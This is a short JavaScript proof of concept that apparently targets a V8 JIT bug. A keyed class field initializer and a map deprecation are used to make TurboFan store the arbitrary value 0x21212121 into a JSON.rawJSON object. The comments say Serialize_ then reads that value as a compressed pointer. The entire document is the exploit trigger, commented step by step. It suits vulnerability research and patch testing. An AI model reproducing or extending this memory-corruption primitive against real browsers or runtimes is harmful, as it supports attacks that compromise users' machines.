const PROP_NAME = "rawJSON",  
      PROP_VALUE = 0x21212121;  // Will be interpreted as a compressed pointer by `Serialize_`.  
  
let define_property_holder = {};  
define_property_holder.for_deprecation = 1;  // See below.  
  
function ReturnHolder() { return define_property_holder; };  
class Trigger extends ReturnHolder {  // Extend a function that returns a value so that it possible  
                                      // to store on an existing object.  
  
  [PROP_NAME] = (     // A keyed class property initializer is translated to a `kDefine` store.  
  
    this[PROP_NAME],  // The store operation performed on the target object will always throw in  
                      // the interpreter, so the object's map won't be added to the feedback slot.  
                      // Emit a load so that its feedback map can be reused by the store.  
    PROP_VALUE  
  )  
};  
  
for (let i = 0; i < 10; ++i)  
  new Trigger;  // The store operation has to have a non-empty feedback slot. Use a regular object  
                // with the writable target property for that.  
  
define_property_holder.for_deprecation = 1.1;  // Deprecate the map in the feedback vector so that  
                                               // it's discarded by TurboFan.  
  
define_property_holder = JSON.rawJSON("1");    // The special target object.  
  
try { new Trigger } catch { }  // Add the target object map to the load operation's feedback slot.  
  
%OptimizeFunctionOnNextCall(Trigger);  
new Trigger;  
  
JSON.stringify(define_property_holder);  